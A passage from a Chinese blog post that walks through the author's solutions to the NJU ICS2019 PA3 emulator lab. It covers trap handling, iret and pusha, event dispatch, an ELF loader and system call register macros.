fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-6ysbvilluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-6ysbvilluwpkzu"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(iret) {  <span class="hljs-comment">//TODO();</span>  <span class="hljs-built_in">rtl_pop</span>(&amp;s0);  <span class="hljs-built_in">rtl_j</span>(s0);  <span class="hljs-built_in">rtl_pop</span>(&amp;cpu.cs);  <span class="hljs-built_in">rtl_pop</span>(&amp;cpu.eflags.val);  <span class="hljs-built_in">print_asm</span>(<span class="hljs-string">"iret"</span>);}</code></pre></div></div><p>同<code>raise_intr</code>，恢复<code>eip</code>，更新decoding中的跳转 eip信息可以直接调用<code>rtl_j</code>实现。实际上就是跳到调用中断的地方去了。</p><p><code>pusha</code></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211433753019_996_20230601235720131761_628_image-20230501222920241.png" alt="image-20230501222920241"><figcaption aria-hidden="true">image-20230501222920241</figcaption></figure><p>顾名思义，它的功能是把所有通用寄存器都压入栈中。这个可以说是非常赏心悦目了，对照实现即可。<code>popa</code>显然也是对称的，不再赘述。</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211434803453_893_20230601235723245458_604_image-20230501223135299.png" alt="image-20230501223135299" width="50%" height="50%"></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-hxw4xwlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-hxw4xwlluwpkzu"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(pusha) {  <span class="hljs-comment">//TODO();</span>    <span class="hljs-built_in">rtl_mv</span>(&amp;s0,&amp;cpu.esp);<span class="hljs-built_in">rtl_push</span>(&amp;cpu.eax);<span class="hljs-built_in">rtl_push</span>(&amp;cpu.ecx);<span class="hljs-built_in">rtl_push</span>(&amp;cpu.edx);<span class="hljs-built_in">rtl_push</span>(&amp;cpu.ebx);<span class="hljs-built_in">rtl_push</span>(&amp;s0);<span class="hljs-built_in">rtl_push</span>(&amp;cpu.ebp);<span class="hljs-built_in">rtl_push</span>(&amp;cpu.esi);<span class="hljs-built_in">rtl_push</span>(&amp;cpu.edi);<span class="hljs-built_in">print_asm</span>(<span class="hljs-string">"pusha"</span>);}</code></pre></div></div><p>接下来讲义要求我们重新组织<code>Context</code>结构体。这个地方卡了一段时间，确实如讲义所说，必须要理解整个中断调用过程，只看代码是看不出什么的。</p><p>触发异常后硬件处理第一步是通过<code>raise_intr</code>依次将触发异常时的PC和处理器状态(对于x86来说就是eflags,cs和eip)压栈，根据异常号找到中断向量表中的中断描述符，描述符给出了该执行哪个中断。比如如果是80系统调用，程序运行后会触发<code>trap.S</code>汇编代码上面的第一个函数<code>__am_vecsys</code>，会压入异常号，然后跳转到<code>__am_asm_trap()</code>。在<code>__am_asm_trap()</code>中，代码将会把用户进程的通用寄存器通过<code>pusha</code>保存到堆栈上。由此形成了陷阱帧。栈由改地址往低地址延伸，因此<code>_Context</code>的顺序与此相反，或者说和<code>popa</code>的顺序是一致的。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-2mbocklluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-2mbocklluwpkzu"><pre><code class="hljs C++">#----|------------entry------------|---irq id---|-----handler-----|.globl __am_vecsys;    __am_vecsys: pushl $<span class="hljs-number">0x80</span>; jmp __am_asm_trap......__am_asm_trap:  pushal  pushl $<span class="hljs-number">0</span>  pushl %esp  call __am_irq_handle</code></pre></div></div><h3 id="事件分发">事件分发</h3><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211436161726_962_20230601235726797182_626_image-20230501223811235.png" alt="image-20230501223811235"><figcaption aria-hidden="true">image-20230501223811235</figcaption></figure><p>讲义中指出，这是因为CTE的<code>__am_irq_handle()</code>函数并未正确识别出自陷事件.根据<code>_yield()</code>的定义,<code>__am_irq_handle()</code>函数需要将自陷事件打包成编号为<code>_EVENT_YIELD</code>的事件。让它识别一下就好:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-2yv1hwlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-2yv1hwlluwpkzu"><pre><code class="hljs C++"><span class="hljs-keyword">switch</span> (c-&gt;irq) {    <span class="hljs-keyword">case</span> <span class="hljs-number">0x81</span>:ev.event=_EVENT_YIELD;<span class="hljs-keyword">break</span>;    <span class="hljs-keyword">default</span>: ev.event = _EVENT_ERROR; <span class="hljs-keyword">break</span>;}</code></pre></div></div><p><code>do_event</code>也识别一下:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-w5km18lluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-w5km18lluwpkzu"><pre><code class="hljs C++"><span class="hljs-keyword">switch</span> (e.event) {    <span class="hljs-keyword">case</span> _EVENT_YIELD:  <span class="hljs-built_in">Log</span>(<span class="hljs-string">"_EVENT_YIELD recognized"</span>);<span class="hljs-keyword">break</span>;    <span class="hljs-keyword">default</span>: <span class="hljs-built_in">panic</span>(<span class="hljs-string">"Unhandled event ID = %d"</span>, e.event);}</code></pre></div></div><p>可以看到识别出来了。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211437260313_511_20230601235728897164_790_image-20230501233745814.png" alt="image-20230501233745814"><figcaption aria-hidden="true">image-20230501233745814</figcaption></figure><h3 id="恢复上下文">恢复上下文</h3><p>恢复上下文需要完成<code>popa</code>操作。因为我在实现<code>pusha</code>的时候已经完成了，因此这里直接触发了<code>panic</code>，任务完成。</p><h3 id="必答题">必答题</h3><h6 id="从nanos-lite调用_yield开始-到从_yield返回的期间-这一趟旅程具体经历了什么">从Nanos-lite调用<code>_yield()</code>开始,到从<code>_yield()</code>返回的期间, 这一趟旅程具体经历了什么？</h6><p>1.<code>nexus-am/am/src/x86/nemu/cte.c</code> 中，_yield函数中执行指令 int 0x81。</p><p></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-o6sm4zlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-o6sm4zlluwpkzu"><pre><code class="hljs C++"><span class="hljs-type">void</span> _yield() {    <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span><span class="hljs-params">(<span class="hljs-string">"int $0x81"</span>)</span></span>;}</code></pre></div></div><p></p><p>2.<code>nemu/src/isa/x86/exec/system.c</code>中，<code>exec_int</code> 函数为 nemu 对 int 指令的执行函数，其中调用了<code>raise_intr</code> 函数，参数为 int 中断编号(此处为 0x81)以及当前的PC 值。一般的中断走的是<code>0xcd</code>分支。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-fwz2s0lluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-fwz2s0lluwpkzu"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(<span class="hljs-type">int</span>) {<span class="hljs-comment">//  TODO();</span>  <span class="hljs-keyword">switch</span>(decinfo.opcode){    <span class="hljs-keyword">case</span> <span class="hljs-number">0xcc</span> : <span class="hljs-built_in">raise_intr</span>(<span class="hljs-number">0x3</span>,decinfo.seq_pc);  <span class="hljs-keyword">break</span>;    <span class="hljs-keyword">case</span> <span class="hljs-number">0xcd</span> : <span class="hljs-built_in">raise_intr</span>(id_dest-&gt;val, decinfo.seq_pc); <span class="hljs-keyword">break</span>;    <span class="hljs-keyword">case</span> <span class="hljs-number">0xce</span> : <span class="hljs-built_in">raise_intr</span>(<span class="hljs-number">0x4</span>, decinfo.seq_pc); <span class="hljs-keyword">break</span>;    }  <span class="hljs-built_in">print_asm</span>(<span class="hljs-string">"int %s"</span>, id_dest-&gt;str);  <span class="hljs-built_in">difftest_skip_dut</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>);}</code></pre></div></div><p>3.<code>nemu/src/isa/x86/intr.c</code> 中，<code>raise_intr</code>函数中读取中断描述符表idt，根据传入的中断编号得到中断处理程序的入口地址(中断描述符表的初始化在<code>_cte_init</code>函数中完成)。接下来就是讲义中的<code>触发异常后硬件的响应过程</code>，我们依次对寄存器eflags ,cs,eip进行压栈，根据IDT找到入口地址，最后将程序转移到中断处理程序入口地址处继续执行。当中断编号为0x81 时，在<code>nexus-am/am/src/x86/nemu/cte.c</code>中的<code>_cte_init</code>函数中我们可以看到中断处理程序为<code>__am_vectrap</code>函数(下面<code>idt[0x81]</code>这一行），因此<code>raise_intr</code>最终的效果是将虚拟机内部运行的程序转移到了其中断服务程序处继续执行。nemu完成了 int 指令的执行。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-g4vp85lluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-g4vp85lluwpkzu"><pre><code class="hljs C++"><span class="hljs-type">int</span> _cte_init(_Context*(*handler)(_Event, _Context*)) {  <span class="hljs-type">static</span> GateDesc idt[NR_IRQ];  <span class="hljs-comment">// initialize IDT</span>  <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NR_IRQ; i ++) {    idt[i] = <span class="hljs-built_in">GATE</span>(STS_TG32, <span class="hljs-built_in">KSEL</span>(SEG_KCODE), __am_vecnull, DPL_KERN);  }  <span class="hljs-comment">// ----------------------- interrupts ----------------------------</span>  idt[<span class="hljs-number">32</span>]   = <span class="hljs-built_in">GATE</span>(STS_IG32, <span class="hljs-built_in">KSEL</span>(SEG_KCODE), __am_irq0,   DPL_KERN);  <span class="hljs-comment">// ---------------------- system call ----------------------------</span>  idt[<span class="hljs-number">0x80</span>] = <span class="hljs-built_in">GATE</span>(STS_TG32, <span class="hljs-built_in">KSEL</span>(SEG_KCODE), __am_vecsys, DPL_USER);  idt[<span class="hljs-number">0x81</span>] = <span class="hljs-built_in">GATE</span>(STS_TG32, <span class="hljs-built_in">KSEL</span>(SEG_KCODE), __am_vectrap, DPL_KERN);  <span class="hljs-built_in">set_idt</span>(idt, <span class="hljs-built_in">sizeof</span>(idt));  <span class="hljs-comment">// register event handler</span>  user_handler = handler;  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre></div></div><p>4.<code>__am_vectrap</code>位于<code>nexus-am/am/src/x86/nemu/trap.S</code> 中，将整数 0x81入栈，跳转到<code>__am_asm_trap</code>继续执行。进行一系列压栈操作后(压的其实就是<code>_Context</code>结构体这个参数，这回答了讲义中“<code>__am_irq_handle()</code>有一个上下文结构指针<code>c</code>这个上下文结构<code>c</code>是怎么来的”这个问题)，转移到函数<code>__am_irq_handle</code>处执行。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-y9ga5rlluwpkzu"></i><span>assembly</span><div class="collapse show" id="collapse-y9ga5rlluwpkzu"><pre><code class="hljs assembly">.globl __am_vectrap;  __am_vectrap: pushl $0x81; jmp __am_asm_trap    __am_asm_trap:  pushal  pushl $0  pushl %esp  call __am_irq_handle  addl $4, %esp  addl $4, %esp  popal  addl $4, %esp  iret</code></pre></div></div><p>5.<code>nexus-am/am/src/x86/nemu/cte.c</code>中，函数<code>__am_irq_handle</code> 根据栈(上下文)中保存的中断号对事件进行打包，调用<code>user_handler</code>对事件进行处理。其中<code>user_handler</code>在<code>_cte_init</code> 中进行了初始化，为<code>do_event</code>函数。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-0trclrlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-0trclrlluwpkzu"><pre><code class="hljs C++">_Context* __am_irq_handle(_Context *c) {  _Context *next = c;  <span class="hljs-keyword">if</span> (user_handler) {    _Event ev = {<span class="hljs-number">0</span>};    <span class="hljs-keyword">switch</span> (c-&gt;irq) {      <span class="hljs-keyword">case</span> <span class="hljs-number">0x81</span>:ev.event=_EVENT_YIELD;<span class="hljs-keyword">break</span>;      <span class="hljs-keyword">default</span>: ev.event = _EVENT_ERROR; <span class="hljs-keyword">break</span>;    }    next = <span class="hljs-built_in">user_handler</span>(ev, c);    <span class="hljs-keyword">if</span> (next == <span class="hljs-literal">NULL</span>) {      next = c;    }  }  <span class="hljs-keyword">return</span> next;}</code></pre></div></div><p><code>user_handler</code>是怎么初始化的呢？具体是<code>_cte_init</code> 中<code>user_handler = handler;</code>这一句，而这个参数<code>handler</code>是<code>init_irq</code>时调用时传给它的，这也回到了<code>main</code>函数为实现上下文做准备的阶段。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-emv2urlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-emv2urlluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init_irq</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> </span>{  <span class="hljs-built_in">Log</span>(<span class="hljs-string">"Initializing interrupt/exception handler..."</span>);  _cte_init(do_event);}</code></pre></div></div><p>6.<code>nanos-lite/src/irq.c</code> 中，<code>do_event</code>函数对传入的时间进行解析，做出相应的操作，对于 <code>yield</code>操作，我们现在直接输出一段文本，表示程序运行至此即可。顾名思义的话应该是要做进程调度，但我们现在仅有一个上下文，因此不做上下文切换，此处直接返回<code>NULL</code>给<code>__am_irq_handle</code>。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-t27z0olluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-t27z0olluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">static</span> _Context* <span class="hljs-title">do_event</span><span class="hljs-params">(_Event e, _Context* c)</span> </span>{  <span class="hljs-keyword">switch</span> (e.event) {    <span class="hljs-keyword">case</span> _EVENT_YIELD:  <span class="hljs-built_in">Log</span>(<span class="hljs-string">"_EVENT_YIELD recognized"</span>);<span class="hljs-keyword">break</span>;    <span class="hljs-keyword">default</span>: <span class="hljs-built_in">panic</span>(<span class="hljs-string">"Unhandled event ID = %d"</span>, e.event);  }  <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;}</code></pre></div></div><p>7.接下来就是沿着上述调用链逐级返回的操作。<code>__am_irq_handle</code>得到 <code>do_event</code>返回的<code>NULL</code>后，不做上下文切换，直接将传入的上下文返回给调用者<code>__am_asm_trap</code>，经过适当的出栈操作后，使用 <code>iret</code>指令进行中断返回，回复现场，回到中断前程序的执行位置。至此，一次自陷操作全部完成。</p><p><code>__am_irq_handle</code>:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-k3468alluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-k3468alluwpkzu"><pre><code class="hljs C++"><span class="hljs-keyword">if</span> (next == <span class="hljs-literal">NULL</span>) {    next = c;}}<span class="hljs-keyword">return</span> next;</code></pre></div></div><p><code>trap.S</code></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-nl2fvylluwpkzu"></i><span>assembly</span><div class="collapse show" id="collapse-nl2fvylluwpkzu"><pre><code class="hljs assembly">call __am_irq_handleaddl $4, %espaddl $4, %esppopaladdl $4, %espiret</code></pre></div></div><p><code>iret</code></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-m6za8elluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-m6za8elluwpkzu"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(iret) {  <span class="hljs-built_in">rtl_pop</span>(&amp;s0);  <span class="hljs-built_in">rtl_j</span>(s0);  <span class="hljs-built_in">rtl_pop</span>(&amp;cpu.cs);  <span class="hljs-built_in">rtl_pop</span>(&amp;cpu.eflags.val);  <span class="hljs-built_in">print_asm</span>(<span class="hljs-string">"iret"</span>);}</code></pre></div></div><p>这个必答题按照整个触发中断时进行上下文管理的过程梳理了一遍。上述实现的过程中是发现缺什么需要补充的，看懂局部的过程进行补充，而在此对整个过程进行了整体的总结。</p><h3 id="思考题">思考题</h3><h6 id="对比异常处理与函数调用">对比异常处理与函数调用</h6><p>我们知道进行函数调用的时候也需要保存调用者的状态: 返回地址,以及calling convention中需要调用者保存的寄存器.而CTE在保存上下文的时候却要保存更多的信息. 尝试对比它们,并思考两者保存信息不同是什么原因造成的。</p><blockquote><p>综合上述提到的异常处理过程，对于x86多保存的主要有eflags,cs,eip和通用寄存器。主要原因是调用子程序过程发生的时间是已知和固定的，即在主程序中的调用指令（CALL）执行时发生，所以我们只需要保存子函数中需要的东西，以及保存返回地址，ebp确保能回到调用者那里就可以。而中断/异常发生的时间一般是随机的。意味着我们需要为当前的寄存器状态提供一个“快照”，因此几乎保存了所有的寄存器。</p></blockquote><h2 id="二阶段">二阶段</h2><h3 id="实现loader">实现loader</h3><p>讲义中指出，现在的ramdisk十分简单, 它只有一个文件,就是我们将要加载的用户程序<code>dummy</code>,可执行文件位于ramdisk偏移为0处,访问它就可以得到用户程序的第一个字节.</p><p>关于用户程序需要加载到的内存位置</p><p>ics2019是这么说的:</p><blockquote><p>为了避免和Nanos-lite的内容产生冲突,我们约定目前用户程序需要被链接到内存位置<code>0x3000000</code>(x86)或<code>0x83000000</code>(mips32或riscv32)附近,Navy-apps已经设置好了相应的选项(见<code>navy-apps/Makefile.compile</code>中的<code>LDFLAGS</code>变量).</p></blockquote><p>ics2018</p><blockquote><p>用户程序需要被链接到内存位置<code>0x4000000</code>处</p></blockquote><p>而且，ics2018这个是作为第一个热身任务，是这么说的:</p><blockquote><p>loader 只需要做一件事情:将 ramdisk 中从 0 开始的所有内容放置在0x4000000,并把这个地 址作为程序的入口返回即可。</p></blockquote><p>但ics2019这个地方就有些复杂，这个地方也研究了好半天。其中<a href="https://vgalaxy.work/2022/01/01/icspa3/#%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6">这篇博客</a>造了一个轮子，但也让我清楚了到底想让我们干什么。</p><p>程序开始的地方由ELF header中的Entry pointaddress来指示，因此我们读出来，返回这个入口地址就可以了。下面的<code>naive_uload</code>将程序入口强制转换一个函数指针并调用，因此我们确信就直接返回这个地址值就可以了。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-4zpupvlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-4zpupvlluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">naive_uload</span><span class="hljs-params">(PCB *pcb, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename)</span> </span>{  <span class="hljs-type">uintptr_t</span> entry = <span class="hljs-built_in">loader</span>(pcb, filename);  <span class="hljs-built_in">Log</span>(<span class="hljs-string">"Jump to entry = %p"</span>, entry);  ((<span class="hljs-built_in">void</span>(*)())entry) ();}</code></pre></div></div><p>但是讲义里还提到:</p><blockquote><p>你需要找出每一个需要加载的segment的<code>Offset</code>,<code>VirtAddr</code>,<code>FileSiz</code>和<code>MemSiz</code>这些参数.其中相对文件偏移<code>Offset</code>指出相应segment的内容从ELF文件的第<code>Offset</code>字节开始,在文件中的大小为<code>FileSiz</code>,它需要被分配到以<code>VirtAddr</code>为首地址的虚拟内存位置,在内存中它占用大小为<code>MemSiz</code>. 也就是说,这个segment使用的内存就是<code>[VirtAddr, VirtAddr + MemSiz)</code>这一连续区间,然后将segment的内容从ELF文件中读入到这一内存区间,并将<code>[VirtAddr + FileSiz, VirtAddr + MemSiz)</code>对应的物理区间清零。</p></blockquote><p>因此还没完。我们没有做清零的工作。因此我们还要根据ELFheader知道有几个segments，然后从ProgramHeader中知道segment的属性。讲义中有一个图表现的比较清楚。然后对每一个段清零。代码如下所示:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-en1hyjlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-en1hyjlluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">uintptr_t</span> <span class="hljs-title">loader</span><span class="hljs-params">(PCB *pcb, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename)</span> </span>{  <span class="hljs-comment">// TODO();</span>  Elf_Ehdr elf_header;  <span class="hljs-type">size_t</span> offset=<span class="hljs-built_in">ramdisk_read</span>(&amp;elf_header,<span class="hljs-number">0</span>,<span class="hljs-built_in">sizeof</span>(Elf_Ehdr));  <span class="hljs-built_in">assert</span>(offset==<span class="hljs-built_in">sizeof</span>(Elf_Ehdr));  Elf_Phdr elf_program_header[elf_header.e_phnum];  offset=<span class="hljs-built_in">ramdisk_read</span>(elf_program_header,elf_header.e_phoff,<span class="hljs-built_in">sizeof</span>(Elf_Phdr)*elf_header.e_phnum);  <span class="hljs-built_in">assert</span>(offset==<span class="hljs-built_in">sizeof</span>(Elf_Phdr)*elf_header.e_phnum);  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;elf_header.e_phnum;i++){    <span class="hljs-comment">// only load PT_LOAD type</span>    <span class="hljs-keyword">if</span>(elf_program_header[i].p_type==PT_LOAD){      <span class="hljs-built_in">ramdisk_read</span>((<span class="hljs-type">void</span>*)elf_program_header[i].p_vaddr,elf_program_header[i].p_offset,elf_program_header[i].p_memsz);      <span class="hljs-comment">// clear the [Virtual Address + File Size, Virtual Address + Memory Size)</span>      <span class="hljs-built_in">memset</span>((<span class="hljs-type">void</span>*)(elf_program_header[i].p_vaddr+elf_program_header[i].p_filesz),<span class="hljs-number">0</span>,elf_program_header[i].p_memsz-elf_program_header[i].p_filesz);    }  }  <span class="hljs-keyword">return</span> elf_header.e_entry;}</code></pre></div></div><p>实现完了按照提示在<code>init_proc()</code>中调用<code>naive_uload(NULL, NULL)</code>。需要在上面声明一下:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-mak3aelluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-mak3aelluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init_proc</span><span class="hljs-params">()</span> </span>{  switch_boot_pcb();  <span class="hljs-built_in">Log</span>(<span class="hljs-string">"Initializing processes..."</span>);  <span class="hljs-comment">// load program here</span>  <span class="hljs-built_in">naive_uload</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);}</code></pre></div></div><p>但是为什么报错呢？使用<code>objdump -S dummy-x86 &gt;dump.txt</code>查看<code>dummy</code>的反汇编代码，发现入口确实找对了，还是这个<code>endbr32</code>的鬼。这好说，改一改编译选项的事，PA2已经遇到过了。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211438200351_288_20230601235731026927_345_image-20230502154536429.png" alt="image-20230502154536429"><figcaption aria-hidden="true">image-20230502154536429</figcaption></figure><p>加到<code>navy_apps</code>的<code>Makefile.compile</code>里面就好。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211439456917_201_20230601235735629917_395_image-20230502155010170.png" alt="image-20230502155010170"><figcaption aria-hidden="true">image-20230502155010170</figcaption></figure><p>同理，在<code>navy_apps</code>底下也要<code>make clean</code>才能生效。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211440453947_652_20230601235740625541_326_image-20230502155347960.png" alt="image-20230502155347960"><figcaption aria-hidden="true">image-20230502155347960</figcaption></figure><p>说明loader已经成功加载dummy。</p><h6 id="堆和栈在哪里">堆和栈在哪里</h6><blockquote><p>栈的使用只发生在函数调用过程中，堆的使用只发生在malloc/free函数调用之后，因此它们都只在动态时有意义，这是为什么它们不需要出现在可执行文件中。</p></blockquote><h6 id="如何识别不同格式的可执行文件">如何识别不同格式的可执行文件?</h6><p>如果你在GNU/Linux下执行一个从Windows拷过来的可执行文件,将会报告"格式错误". 思考一下, GNU/Linux是如何知道"格式错误"的?</p><blockquote><p>根据ELF 文件头的前 4 个字节即“魔数”判断。</p></blockquote><h6 id="为什么要清零">为什么要清零?</h6><p>为什么需要将 <code>[VirtAddr + FileSiz, VirtAddr + MemSiz)</code>对应的物理区间清零?</p><blockquote><p>如讲义中所说，FileSiz 表示这个段在文件中的大小，而 MemSiz表示这个段在内存中的大小。我们知道可执行文件的各个段包括代码段、数据段、BSS段等。由于 BSS 段没有实际的数据，所以它的 FileSiz 为 0，而 MemSiz表示它需要占用的空间大小。BSS段是程序运行时未初始化的全局变量和静态变量所占据的内存空间，我们写C程序知道这变量默认应当为0的，因此要清零。</p></blockquote><h3 id="识别系统调用">识别系统调用</h3><p><code>a[0] = c-&gt;GPR1;</code>保存的是系统调用的参数，<code>dummy</code>程序,它触发了一个<code>SYS_yield</code>系统调用. 我们约定,这个系统调用直接调用CTE的<code>_yield()</code>即可,然后返回<code>0</code>.因此我们需要处理的第一个<code>case</code>是<code>SYS_yield</code>。下面又说“处理系统调用的最后一件事就是设置系统调用的返回值.对于不同的ISA, 系统调用的返回值存放在不同的寄存器中,宏<code>GPRx</code>用于实现这一抽象,所以我们通过<code>GPRx</code>来进行设置系统调用返回值即可.”换句话说，刚才的返回0就是把这个<code>GPRx</code>寄存器设置成0；查看宏定义，它在<code>x86</code>中是<code>eip</code>。这不是胡扯吗。。<code>eip</code>是指针寄存器，返回值应当存到通用寄存器里啊。看要求果然有“在<code>nexus-am/am/include/arch/$ISA-nemu.h</code>中实现正确的<code>GPR?</code>宏”，因此我们先把这个错改过来:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-f6dfrslluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-f6dfrslluwpkzu"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> GPR1 eax</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> GPR2 ebx</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> GPR3 ecx</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> GPR4 edx</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> GPRx eax</span></code></pre></div></div><p>依据的是下面的定义:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-yekov0lluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-yekov0lluwpkzu"><pre><code class="hljs C++"><span class="hljs-comment">// ISA-depedent definitions</span><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(__ISA_X86__)</span><span class="hljs-meta"># <span class="hljs-keyword">define</span> ARGS_ARRAY (<span class="hljs-string">"int $0x80"</span>, <span class="hljs-string">"eax"</span>, <span class="hljs-string">"ebx"</span>, <span class="hljs-string">"ecx"</span>, <span class="hljs-string">"edx"</span>, <span class="hljs-string">"eax"</span>)</span></code></pre></div></div><p>这个ARRAY对应的就是封装的系统调用的四个参数:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-7w0nhklluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-7w0nhklluwpkzu"><pre><code class="hljs C++"><span class="hljs-type">intptr_t</span> _syscall_(<span class="hljs-type">intptr_t</span> type, <span class="hljs-type">intptr_t</span> a0, <span class="hljs-type">intptr_t</span> a1, <span class="hljs-type">intptr_t</span> a2) {  <span class="hljs-function"><span class="hljs-keyword">register</span> <span class="hljs-type">intptr_t</span> _gpr1 <span class="hljs-title">asm</span> <span class="hljs-params">(GPR1)</span> </span>= type;  <span class="hljs-function"><span class="hljs-keyword">register</span> <span class="hljs-type">intptr_t</span> _gpr2 <span class="hljs-title">asm</span> <span class="hljs-params">(GPR2)</span> </span>= a0;  <span class="hljs-function"><span class="hljs-keyword">register</span> <span class="hljs-type">intptr_t</span> _gpr3 <span class="hljs-title">asm</span> <span class="hljs-params">(GPR3)</span> </span>= a1;  <span class="hljs-function"><span class="hljs-keyword">register</span> <span class="hljs-type">intptr_t</span> _gpr4 <span class="hljs-title">asm</span> <span class="hljs-params">(GPR4)</span> </span>= a2;  <span class="hljs-function"><span class="hljs-keyword">register</span> <span class="hljs-type">intptr_t</span> ret <span class="hljs-title">asm</span> <span class="hljs-params">(GPRx)</span></span>;  <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span> <span class="hljs-params">(SYSCALL : <span class="hljs-string">"=r"</span> (ret) : <span class="hljs-string">"r"</span>(_gpr1), <span class="hljs-string">"r"</span>(_gpr2), <span class="hljs-string">"r"</span>(_gpr3), <span class="hljs-string">"r"</span>(_gpr4))</span></span>;  <span class="hljs-keyword">return</span> ret;}</code></pre></div></div><p>然后我们去按部就班实现“约定”:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-c5ktsrlluwpkzu"></i><span>C++</span><div class="collapse show" 